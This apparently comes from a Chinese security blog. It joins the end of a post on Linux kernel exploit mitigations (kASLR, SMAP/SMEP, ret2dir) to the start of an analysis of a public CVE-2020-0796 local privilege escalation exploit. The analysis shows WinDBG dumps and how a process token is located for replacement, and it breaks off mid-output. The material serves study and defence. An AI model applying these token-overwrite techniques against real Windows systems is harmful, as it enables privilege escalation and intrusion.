<h3 id="2-3-禁用-dev-kmem-dev-kmem-disabled"><a href="#2-3-禁用-dev-kmem-dev-kmem-disabled" class="headerlink" title="2.3 禁用/dev/kmem(/dev/kmem disabled)"></a>2.3 禁用/dev/kmem(/dev/kmem disabled)</h3><p>/ dev / kmem不再是现代用户，攻击者无法使用它来加载内核rootkit。 CONFIG_DEVKMEM设置为“ n”。 尽管/ dev / kmem设备节点通过Ubuntu 9.04在Ubuntu 8.04 LTS中仍然存在，但实际上并没有附加到内核中的任何内容。</p>
<h3 id="2-4-禁止模块加载-Block-module-loading"><a href="#2-4-禁止模块加载-Block-module-loading" class="headerlink" title="2.4 禁止模块加载(Block module loading)"></a>2.4 禁止模块加载(Block module loading)</h3><p>在Ubuntu 8.04 LTS及更早版本中，可以从系统范围的功能边界集中删除CAP_SYS_MODULES，这将阻止加载任何新的内核模块。 这是阻止安装内核rootkit的另一层保护。 2.6.25 Linux内核（Ubuntu 8.10）更改了边界集的工作方式，该功能消失了。 从Ubuntu 9.10开始，现在可以通过在/ proc / sys / kernel / modules_disabled中设置“ 1”来再次阻止模块加载。</p>
<h3 id="2-5-只读数据节-Read-only-data-sections"><a href="#2-5-只读数据节-Read-only-data-sections" class="headerlink" title="2.5 只读数据节(Read-only data sections)"></a>2.5 只读数据节(Read-only data sections)</h3><p>这样可以确保将某些内核数据段标记为禁止修改。 这有助于防止某些类的内核rootkit。 通过CONFIG_DEBUG_RODATA选项启用。</p>
<h3 id="2-6-栈的保护-Stack-protector"><a href="#2-6-栈的保护-Stack-protector" class="headerlink" title="2.6 栈的保护(Stack protector)"></a>2.6 栈的保护(Stack protector)</h3><p>类似于ELF程序用户空间中的栈保护器，内核也可以保护其内部栈。 通过CONFIG_CC_STACKPROTECTOR选项启用。</p>
<h3 id="2-7-模块只读或不可执行-Module-RO-NX"><a href="#2-7-模块只读或不可执行-Module-RO-NX" class="headerlink" title="2.7 模块只读或不可执行(Module RO/NX)"></a>2.7 模块只读或不可执行(Module RO/NX)</h3><p>此功能扩展了CONFIG_DEBUG_RODATA，对内核中已加载模块也有类似限制。 这可以帮助抵御依赖已加载模块中各种内存区域的内核攻击。通过CONFIG_DEBUG_MODULE_RONX选项启用。</p>
<h3 id="2-8-限制内核地址显示-Kernel-Address-Display-Restriction"><a href="#2-8-限制内核地址显示-Kernel-Address-Display-Restriction" class="headerlink" title="2.8 限制内核地址显示(Kernel Address Display Restriction)"></a>2.8 限制内核地址显示(Kernel Address Display Restriction)</h3><p>当攻击者试图开发通用性更强的漏洞利用程序时，他们通常需要知道内核结构的位置。 通过将内核地址视为敏感信息，常规本地用户无法看到那些地址。 从Ubuntu 11.04开始，/ proc / sys / kernel / kptr_restrict设置为“ 1”，以阻止报告已知的内核地址泄漏。 此外，只有root用户才能读取各种文件和目录：/boot/vmlinuz<em>、/boot/System.map</em>、/sys/kernel/debug/、/proc/slabinfo</p>
<h3 id="2-9-内核地址空间布局随机化-Kernel-Address-Space-Layout-Randomisation"><a href="#2-9-内核地址空间布局随机化-Kernel-Address-Space-Layout-Randomisation" class="headerlink" title="2.9 内核地址空间布局随机化(Kernel Address Space Layout Randomisation)"></a>2.9 内核地址空间布局随机化(Kernel Address Space Layout Randomisation)</h3><p>内核地址空间布局随机化（kASLR）旨在通过随机化内核的基地址来使某些内核利用更加难以实现。依赖于内核符号位置的漏洞利用必须发现随机基址。</p>
<p>kASLR从Ubuntu 14.10开始可用，但默认情况下未启用。 在内核命令行上指定“ kaslr”选项以使用kASLR。</p>
<p>注意：启用kASLR将会禁用休眠模式。</p>
<h3 id="2-10-冷门协议黑名单-Blacklist-Rare-Protocols"><a href="#2-10-冷门协议黑名单-Blacklist-Rare-Protocols" class="headerlink" title="2.10 冷门协议黑名单(Blacklist Rare Protocols)"></a>2.10 冷门协议黑名单(Blacklist Rare Protocols)</h3><p>通常，内核允许通过MODULE_ALIAS_NETPROTO（PF _…）宏按需自动加载所有网络协议。由于这些协议中的许多协议对于旧版Ubuntu用户来说都是旧的，稀有的或通常很少使用的，并且可能包含未发现的可利用漏洞，因此自Ubuntu 11.04起，它们已被列入黑名单。 其中包括：ax25，netrom，x25，rose，decnet，econet，rds和af_802154。 如果需要任何协议，则可以通过modprobe专门加载它们，或者可以更新/etc/modprobe.d/blacklist-rare-network.conf文件以删除黑名单条目。</p>
<h3 id="2-11-过滤系统调用-Syscall-Filtering"><a href="#2-11-过滤系统调用-Syscall-Filtering" class="headerlink" title="2.11 过滤系统调用(Syscall Filtering)"></a>2.11 过滤系统调用(Syscall Filtering)</h3><p>程序可以使用seccomp_filter接口过滤掉内核syscall的可用性。 这是在容器或沙箱中完成的，这些容器或沙箱希望在潜在运行不受信任的软件时进一步限制对内核接口的访问。</p>
<p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p>
<p>CTF中的seccomp详见：</p>
<p><a href="https://www.jianshu.com/p/969219ce9050" target="_blank" rel="noopener">https://www.jianshu.com/p/969219ce9050</a></p>
<p><a href="https://blog.csdn.net/tan6600/article/details/80967853" target="_blank" rel="noopener">https://blog.csdn.net/tan6600/article/details/80967853</a></p>
<h3 id="2-12-限制dmesg-dmesg-restrictions"><a href="#2-12-限制dmesg-dmesg-restrictions" class="headerlink" title="2.12 限制dmesg(dmesg restrictions)"></a>2.12 限制dmesg(dmesg restrictions)</h3><p>当攻击者试图开发通用性更强的漏洞利用程序时，他们经常会使用dmesg输出。通过将dmesg输出视为敏感信息，攻击者无法使用此输出。从Ubuntu 12.04 LTS开始，可以将/ proc / sys / kernel / dmesg_restrict设置为“ 1”，以将dmesg输出视为敏感内容。 Ubuntu Touch内核默认情况下启用了此功能。</p>
<h3 id="2-13-禁止kexec-Block-kexec"><a href="#2-13-禁止kexec-Block-kexec" class="headerlink" title="2.13 禁止kexec(Block kexec)"></a>2.13 禁止kexec(Block kexec)</h3><p>从Ubuntu 14.04 LTS开始，现在可以通过sysctl禁用kexec。在Ubuntu中启用了CONFIG_KEXEC，因此最终用户可以根据需要使用kexec，新的sysctl允许管理员禁用kexec_load。 例如，这在设置CONFIG_STRICT_DEVMEM和modules_disabled的环境中是理想的。</p>
<h3 id="2-14-UEFI安全启动-UEFI-Secure-Boot"><a href="#2-14-UEFI安全启动-UEFI-Secure-Boot" class="headerlink" title="2.14 UEFI安全启动(UEFI Secure Boot)"></a>2.14 UEFI安全启动(UEFI Secure Boot)</h3><p>从Ubuntu 12.04 LTS开始，UEFI安全启动在引导加载程序的强制模式和内核的非强制模式下实现。 使用此配置，无法验证的内核将只能在未启用UEFI兼容模式(quirks)下启动。Ubuntu 18.04 LTS的Ubuntu 18.04.2版本为引导加载程序和内核启用了强制模式，因此验证失败的内核不会启动，而且验证失败的内核模块也不会加载。 </p>
<h3 id="2-15-内核页表隔离-Kernel-PageTable-Isolation"><a href="#2-15-内核页表隔离-Kernel-PageTable-Isolation" class="headerlink" title="2.15 内核页表隔离(Kernel PageTable Isolation)"></a>2.15 内核页表隔离(Kernel PageTable Isolation)</h3><p>今年年初的CPU漏洞让内核页表隔离(KPTI, Kernel PageTable Isolation)进入了人们的视野。进程地址空间被分成了内核地址空间和用户地址空间，其中内核地址空间映射到了整个物理地址空间，而用户地址空间只能映射到指定的物理地址空间。内核地址空间和用户地址空间共用一个页全局目录表。为了彻底防止用户程序获取内核数据，可以令内核地址空间和用户地址空间使用两组页表集。linux内核从4.15开始支持KPTI，windows上把这个叫KVA Shadow，原理类似。更多细节请见参考资料。</p>
<h3 id="2-16-SMAP-SMEP"><a href="#2-16-SMAP-SMEP" class="headerlink" title="2.16 SMAP/SMEP"></a>2.16 SMAP/SMEP</h3><p>SMAP(Supervisor Mode Access Prevention，管理模式访问保护)和SMEP(Supervisor Mode Execution Prevention，管理模式执行保护)的作用分别是禁止内核访问用户空间的数据和禁止内核执行用户空间的代码。arm里面叫PXN(Privilege Execute Never)和PAN(Privileged Access Never)。SMEP类似于前面说的NX，不过一个是在内核态中，一个是在用户态中。和NX一样SMAP/SMEP需要处理器支持，可以通过cat /proc/cpuinfo查看，在内核命令行中添加nosmap和nosmep禁用。windows系统从win8开始启用SMEP，windows内核枚举哪些处理器的特性可用，当它看到处理器支持SMEP时通过在CR4寄存器中设置适当的位来表示应该强制执行SMEP，可以通过ROP或者jmp到一个RWX的内核地址绕过。linux内核从3.0开始支持SMEP，3.7开始支持SMAP。</p>
<p>在没有SMAP/SMEP的情况下把内核指针重定向到用户空间的漏洞利用方式被称为ret2usr。physmap是内核管理的一块非常大的连续的虚拟内存空间，为了提高效率，该空间地址和RAM地址直接映射。RAM相对physmap要小得多，导致了任何一个RAM地址都可以在physmap中找到其对应的虚拟内存地址。另一方面，我们知道用户空间的虚拟内存也会映射到RAM。这就存在两个虚拟内存地址(一个在physmap地址，一个在用户空间地址)映射到同一个RAM地址的情况。也就是说，我们在用户空间里创建的数据，代码很有可能映射到physmap空间。基于这个理论在用户空间用mmap()把提权代码映射到内存，然后再在physmap里找到其对应的副本，修改EIP跳到副本执行就可以了。因为physmap本身就是在内核空间里，所以SMAP/SMEP都不会发挥作用。这种漏洞利用方式叫ret2dir。</p>
<h2 id="3-checksec"><a href="#3-checksec" class="headerlink" title="3 checksec"></a>3 checksec</h2><p>Checksec是一个用于检查可执行文件的正在使用的标准Linux OS或PaX的安全特性（例如PIE，RELRO，PaX，Canaries，ASLR，Fortify Source）的bash脚本。 它最初是由<a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="noopener">Tobias Klein</a>编写，自2011年的v1.5版本之后，不再维护。新版本来自github.com/slimm609/的<a href="[https://github.com/slimm609/checksec.sh/](https://github.com/slimm609/checksec.sh/)">开源项目</a>。</p>
<p>[^PaX]: PaX是针对Linux Kernel的一个加固版本的补丁，它让Linux内核的内存页受限于最小权限原则，是一个”有效防御系统级别0DAY”的方案。</p>
<p>checksec的使用方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$checksec --file&#x3D;&#x2F;bin&#x2F;ls</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   &#x2F;bin&#x2F;ls</span><br></pre></td></tr></table></figure>

<p>一般来说，也可以使用gdb中peda插件自带的checksec功能，如下图所示：</p>
<p><img src="/2020/04/28/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E7%BC%BA%E9%99%B7%E7%BC%93%E8%A7%A3%E6%9C%BA%E5%88%B6/%E5%9B%BE-1.png" alt="图 1"></p>
<p>上图所示的<font color="red"><strong>CANARY: disabled</strong></font>表示没有开启栈保护特性。</p>
<h2 id="4-参考和引用"><a href="#4-参考和引用" class="headerlink" title="4 参考和引用"></a>4 参考和引用</h2><p><a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
<p><a href="https://www.infoq.cn/article/Linux-PaX-Grsecurity/" target="_blank" rel="noopener">https://www.infoq.cn/article/Linux-PaX-Grsecurity/</a></p>
<p><a href="https://blog.csdn.net/zsj2102/article/details/78734981" target="_blank" rel="noopener">https://blog.csdn.net/zsj2102/article/details/78734981</a></p>
<p><a href="https://bbs.pediy.com/thread-226696.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226696.htm</a></p>
<p><a href="https://wiki.ubuntu.com/Security/Features" target="_blank" rel="noopener">https://wiki.ubuntu.com/Security/Features</a></p>
<p><a href="https://manybutfinite.com/post/anatomy-of-a-program-in-memory/" target="_blank" rel="noopener">https://manybutfinite.com/post/anatomy-of-a-program-in-memory/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://www.stxletto.com/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="stxletto">
      <meta itemprop="description" content="安全风云波澜壮阔，对酒当歌人间值得。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="深澜深蓝">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">漏洞利用视角下的CVE-2020-0796漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-04-28 22:37:35 / 修改时间：22:42:07" itemprop="dateCreated datePublished" datetime="2020-04-28T22:37:35+08:00">2020-04-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="漏洞利用视角下的CVE-2020-0796漏洞"><a href="#漏洞利用视角下的CVE-2020-0796漏洞" class="headerlink" title="漏洞利用视角下的CVE-2020-0796漏洞"></a>漏洞利用视角下的CVE-2020-0796漏洞</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h2><p>初见是惊鸿一瞥，重逢是始料未及。</p>
<p>各位“蓝颜知己”我们又见面了，本文是《漏洞分析视角下的CVE-2020-0796漏洞》的兄弟篇。CVE-2020-796漏洞成因已经在前文说明，这次我们从漏洞利用视角来看看CVE-2020-796漏洞。</p>
<p>这次我们分析对象是github.com/danigargu上的本地权限提升(LPE，Local Privilege Escalation)利用(Exploit)。</p>
<p>LPE的exploit是以C++源码形式提供的，这也有便于我们分析exploit开发原理。我们可以用Microsoft Visual Studio编译它。然后以非管理员身份运行cmd程序，执行编译后的文件cve-2020-07960local.exe。如图1所示：</p>
<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-1.jpg" alt="img"></p>
<center>图1</center>

<p>在exploit执行前后的whoami命令显示用户名并未改变。</p>
<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-2.jpg" alt="img"></p>
<center>图2</center>

<p>如图2所示，而是新弹出一个cmd的界面，在其中执行whoami显示用户名已经被修改为nt authority\system</p>
<p>幸亏本文标题不是《漏洞复现视角下的CVE-2020-0796漏洞》，不然本文就到此为止了。由此可见选一个好标题的重要性，来让我们看看，这一闪而显的黑窗口背后发生了什么。</p>
<h2 id="2-一串神奇的数字"><a href="#2-一串神奇的数字" class="headerlink" title="2 一串神奇的数字"></a>2 一串神奇的数字</h2><p>使用之前分析工作中的断点，查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp srv2!Srv2DecompressData+0x108 &quot;.printf \&quot;srv2!memmove(Src&#x3D;0x%I64x, Dst&#x3D;0x%I64x,Size&#x3D;%d) \n\&quot;, rdx, rcx, r8d;db rdx;.echo&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">srv2!memmove(Src&#x3D;0xffffc68fe8ee2840, Dst&#x3D;0xffff8d8dec51e0a0,Size&#x3D;16)</span><br><span class="line"></span><br><span class="line">kd&gt; r</span><br><span class="line">rax&#x3D;ffffc68fe8ee2540 rbx&#x3D;ffffc68fea74c150 rcx&#x3D;ffff8d8dec51e0a0</span><br><span class="line">rdx&#x3D;ffffc68fe8ee2840 rsi&#x3D;0000000000000010 rdi&#x3D;ffffc68fe8ee22c0</span><br><span class="line">rip&#x3D;fffff80fae8a7f68 rsp&#x3D;fffff2013002ee70 rbp&#x3D;0000000000000002</span><br><span class="line"> r8&#x3D;0000000000000010 r9&#x3D;ffffc68fea9012a0 r10&#x3D;ffffc68fe7e02160</span><br><span class="line">r11&#x3D;fffff2013002ee50 r12&#x3D;0000000000000000 r13&#x3D;ffffc68fec5ff240</span><br><span class="line">r14&#x3D;00000000ffffffff r15&#x3D;0000000000000000</span><br><span class="line">iopl&#x3D;0     nv up ei ng nz na pe nc</span><br><span class="line">cs&#x3D;0010 ss&#x3D;0018 ds&#x3D;002b es&#x3D;002b fs&#x3D;0053 gs&#x3D;002b       efl&#x3D;00000282</span><br><span class="line">srv2!Srv2DecompressData+0x108:</span><br><span class="line">fffff80f&#96;ae8a7f68 e85376ffff   call  srv2!memcpy (fffff80f&#96;ae89f5c0)</span><br></pre></td></tr></table></figure>

<p>目的地址内存：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; db 0xffff8d8dec51e0a0 L0n16</span><br><span class="line">ffff8d8d&#96;ec51e0a0 00 00 88 02 06 00 00 00-00 00 80 00 00 00 00 00 ................</span><br></pre></td></tr></table></figure>

<p>源地址内存：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; db 0xffffc68fe8ee2840 L0n16</span><br><span class="line">ffffc68f&#96;e8ee2840 bc ff ff f2 1f 00 00 00-bc ff ff f2 1f 00 00 00 ................</span><br></pre></td></tr></table></figure>

<p>这个Exploit要从一个特定的地址读16字节的数据，然后再写入另一个特定的地方去。</p>
<p>根据前文的分析，此处memmove的函数，是要把数据流头部未压缩的数据，移动过来，完成预定的解压缩业务流程。</p>
<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-3.jpg" alt="img"></p>
<center>图3</center>

<p>如图3所示，从我们抓到的流量数据来看，offset大小与memmove的size，以及数据和数据的确能匹配上。</p>
<p>我们要搞明白这个来自网络流中，现在是memmove的源地址存放的数据，对这个特定目的地址来说有什么特别的意义。</p>
<p>一番眼花缭乱的操作之后，“我不再是我”。我们需要额外了解一些关于Windows内核提权的小技巧。</p>
<p>这是一个在虚拟世界中如何向Windows“证明你自己是你自己”的问题。和现实世界中“大内侍卫凌凌漆的腰牌”有些类似。</p>
<h2 id="3-进程的访问令牌"><a href="#3-进程的访问令牌" class="headerlink" title="3 进程的访问令牌"></a>3 进程的访问令牌</h2><p>微软文档中关于访问令牌（Access Token，原文详见引用2）的描述如下：</p>
<p>访问令牌是一个描述进程或线程的安全上下文的对象。令牌中的信息包括与进程或线程关联的用户帐号的标识和特权。当用户登录时，系统通过将用户密码与安全数据库中存储的信息进行比较来验证用户密码。如果密码通过了验证，则系统将生成一个访问令牌。 以该用户名义执行的每个进程都有此访问令牌的副本。</p>
<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。 访问令牌包含以下信息：</p>
<p>·     用户帐号的<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/security-identifiers" target="_blank" rel="noopener">安全标识符</a>（SID）<br>·     用户所属的组的SID<br>·     标识当前登录会话的登录SID<br>·     用户或用户组拥有的<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/privileges" target="_blank" rel="noopener">特权</a>列表<br>·     所有者SID<br>·     主要组（primary group）的SID<br>·     用户创建安全对象而没有指定<a href="https://docs.microsoft.com/windows/desktop/SecGloss/s-gly" target="_blank" rel="noopener"><em>安全描述符</em></a>时，系统使用的默认<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists" target="_blank" rel="noopener">DACL</a><br>·     访问令牌的来源<br>·     令牌是<a href="https://docs.microsoft.com/windows/desktop/SecGloss/p-gly" target="_blank" rel="noopener">主</a>令牌(<a href="https://docs.microsoft.com/windows/desktop/SecGloss/p-gly" target="_blank" rel="noopener"><em>primary</em></a> token）还是<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/client-impersonation" target="_blank" rel="noopener">模拟</a>令牌（<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/client-impersonation" target="_blank" rel="noopener">impersonation</a> token）<br>·     <a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/restricted-tokens" target="_blank" rel="noopener">限制SID</a>（<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/restricted-tokens" target="_blank" rel="noopener">restricting SIDs</a>）的可选列表<br>·     当前的模拟级别<br>·     其他统计信息</p>
<p>每个进程都有一个主要令牌，用于描述与该进程关联的用户帐号的安全上下文。 默认情况下，当进程的线程与安全对象进行交互时，系统将使用主令牌。 此外，线程可以模拟当事人帐号（client account）。 模拟允许线程使用当事人的安全上下文与安全对象进行交互。 模拟当事人的线程同时具有主令牌和模拟令牌。</p>
<h2 id="4-ATT-amp-CK中的访问令牌操纵攻击技术"><a href="#4-ATT-amp-CK中的访问令牌操纵攻击技术" class="headerlink" title="4 ATT&amp;CK中的访问令牌操纵攻击技术"></a>4 ATT&amp;CK中的访问令牌操纵攻击技术</h2><p>MITRE ATT&amp;CK®是一个基于真实世界的观察对手的战术和技术的可全球访问的知识库。ATT＆CK知识库被用作在私营部门、政府以及网络安全产品和服务社区中开发特定威胁模型和方法的基础。</p>
<p>在权限提升（<a href="https://attack.mitre.org/tactics/TA0004/" target="_blank" rel="noopener">Privilege Escalation</a>）一节中的访问令牌操纵（<a href="https://attack.mitre.org/techniques/T1134" target="_blank" rel="noopener">Access Token Manipulation</a>）详细介绍了在Windows系统中通过如何操纵访问令牌来提升权限的技巧。</p>
<p>Windows使用访问令牌来确定正在运行的进程的所有权。用户可以操纵访问令牌以使正在运行的进程看起来像它属于启动该进程的用户以外的其他人。发生这种情况时，该进程还将采用与新令牌关联的安全上下文。例如，Microsoft提倡使用访问令牌作为最佳安全实践。管理员应以标准用户身份登录，通过内置的访问令牌操作命令runas，以管理员特权运行其工具。</p>
<p>攻击者可以使用访问令牌在不同的用户或系统安全上下文下进行操作，并逃避检测。对手可以使用内置的Windows API函数来复制现有进程中的访问令牌；这被称为令牌窃取。对手必须已经在特权用户上下文（即管理员）中才能窃取令牌。但是，攻击者通常使用令牌窃取来将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户在远程系统上具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
<h2 id="5-手动修改访问令牌"><a href="#5-手动修改访问令牌" class="headerlink" title="5 手动修改访问令牌"></a>5 手动修改访问令牌</h2><p>我们了解到Windows识别进程的身份靠的就是这个令牌。在Windows中应用态的内存可被进程任意读写，为了更好地安全性，Windows把令牌（token）的放进了内核态。</p>
<p>先看其中一个手动修改方法：</p>
<p>WinDBG中的!process扩展命令会显示指定进程或者全部进程的EPROCESS块信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !process 0 0 System</span><br><span class="line">PROCESS ffff980dd646a380</span><br><span class="line">  SessionId: none Cid: 0004  Peb: 00000000 ParentCid: 0000</span><br><span class="line">  DirBase: 001ad002 ObjectTable: ffffd5872c604b80 HandleCount: 2203.</span><br><span class="line">  Image: System</span><br></pre></td></tr></table></figure>

<p>其中的PROCESS ffff980dd646a380即表示System进程的EPROCESS的内存地址是0x ffff980dd646a380。</p>
<p>可使用dt _EPROCESS指令查看0x ffff980dd646a380地址处的EPROCESS块信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _EPROCESS ffff980dd646a380</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">  +0x000 Pcb       : _KPROCESS</span><br><span class="line">  +0x2e0 ProcessLock   : _EX_PUSH_LOCK</span><br><span class="line">  +0x2e8 UniqueProcessId : 0x00000000&#96;00000004 Void</span><br><span class="line">  +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0xffff980d&#96;d64d2370 - 0xfffff804&#96;6ece1bc0 ]</span><br><span class="line">  +0x300 RundownProtect  : _EX_RUNDOWN_REF</span><br><span class="line">..</span><br><span class="line">  +0x360 Token      : _EX_FAST_REF</span><br><span class="line">..</span><br></pre></td></tr></table></figure>

<p>EPROCESS是较大的结构体，我们省略了部分，重点关注0x360偏移处的这个Token结构。该结构是一个_EX_FAST_REF类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _EX_FAST_REF</span><br><span class="line">nt!_EX_FAST_REF</span><br><span class="line">  +0x000 Object      : Ptr64 Void</span><br><span class="line">  +0x000 RefCnt      : Pos 0, 4 Bits</span><br><span class="line">  +0x000 Value      : Uint8B</span><br></pre></td></tr></table></figure>

<p>观察_EX_FAST_REF字段定义可知，0~4bit是引用计数，其余bit位才是value。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dq ffff980dd646a380+0x360 L1</span><br><span class="line">ffff980d&#96;d646a6e0 ffffd587&#96;2c60604f</span><br></pre></td></tr></table></figure>

<p>一般会通过位与法获得最终的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; ? ffffd587&#96;2c60604f &amp; ffffffff&#96;fffffff0</span><br><span class="line">Evaluate expression: -46698434895808 &#x3D; ffffd587&#96;2c606040</span><br></pre></td></tr></table></figure>

<p>可使用!token扩展指令查看令牌的具体结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !token ffffd587&#96;2c606040</span><br><span class="line">_TOKEN 0xffffd5872c606040</span><br><span class="line">TS Session ID: 0</span><br><span class="line">User: S-1-5-18</span><br><span class="line">User Groups: </span><br><span class="line"> 00 S-1-5-32-544  Attributes - Default Enabled Owner </span><br><span class="line"> 01 S-1-1-0  Attributes - Mandatory Default Enabled </span><br><span class="line"> 02 S-1-5-11  Attributes - Mandatory Default Enabled </span><br><span class="line"> 03 S-1-16-16384  Attributes - GroupIntegrity GroupIntegrityEnabled </span><br><span class="line"></span><br><span class="line">Primary Group: S-1-5-18</span><br><span class="line"></span><br><span class="line">Privs: </span><br><span class="line"> 02 0x000000002 SeCreateTokenPrivilege      Attributes - </span><br><span class="line"> 03 0x000000003 